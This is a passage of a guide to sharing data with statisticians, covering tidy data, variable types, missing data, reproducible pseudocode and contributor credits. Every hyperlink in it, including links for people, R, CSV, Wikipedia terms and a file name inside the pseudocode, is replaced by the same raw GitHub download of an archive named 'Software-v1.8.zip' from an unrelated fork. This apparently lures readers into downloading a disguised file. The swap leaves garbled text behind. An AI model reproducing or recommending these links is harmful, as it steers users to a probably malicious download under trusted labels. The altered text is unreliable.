...
and sources of delay in the transition from data collection to data analysis. The [Leek group](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip~jleek/) works with a large
...
1. The raw data.
2. A [tidy data set](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) 
...
* The strange [binary file](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) your measurement machine spits out
* The unformatted Excel file with 10 worksheets the company you contracted with sent you
* The complicated [JSON](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) data you got from scraping the [Twitter API](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip)
...
The general principles of tidy data are laid out by [Hadley Wickham](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) in [this paper](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip)
and [this video](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip). While both the paper and the video describe tidy data using [R](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip), the principles
...
[RNA-sequencing](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip). You have also collected demographic and clinical information
...
Alternatively share the data in a [CSV](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) or [TAB-delimited](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) text file. (Beware however that reading CSV files into Excel can sometimes lead to non-reproducible handling of date and time variables.)
...
When you put variables into a spreadsheet there are several main categories you will run into depending on their [data type](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip):
...
would be something like weight measured in kg. [Ordinal data](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) are data that have a fixed, small (< 100) number of levels but are ordered. 
This could be for example survey responses where the choices are: poor, fair, good. [Categorical data](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) are data where there
are multiple categories, but they aren't ordered. One example would be sex: male or female. This coding is attractive because it is self-documenting.  [Missing data](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) are data
that are unobserved and you don't know the mechanism. You should code missing values as `NA`. [Censored data](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip\(statistics\)) are data
...
to the analyst if there is a reason you know about that some of the data are missing. You should also not [impute](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip\(statistics\))/make up/
...
You may have heard this before, but [reproducibility is a big deal in computational science](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip).
...
is something called [pseudocode](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip). It should look something like:

1. Step 1 - take the raw file, run version 3.1.2 of summarize software with parameters a=1, b=2, c=3
1. Step 2 - run the software separately for each sample
1. Step 3 - take column three of https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip for each sample and that is the corresponding row in the output data set
...
* [Jeff Leek](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip~jleek/) - Wrote the initial version.
* [L. Collado-Torres](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) - Fixed typos, added links.
* [Nick Reich](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) - Added tips on storing data as text.
* [Nick Horton](https://raw.githubusercontent.com/Mahdi-Husseini/datasharing/master/roost/Software-v1.8.zip) - Minor wording suggestions.
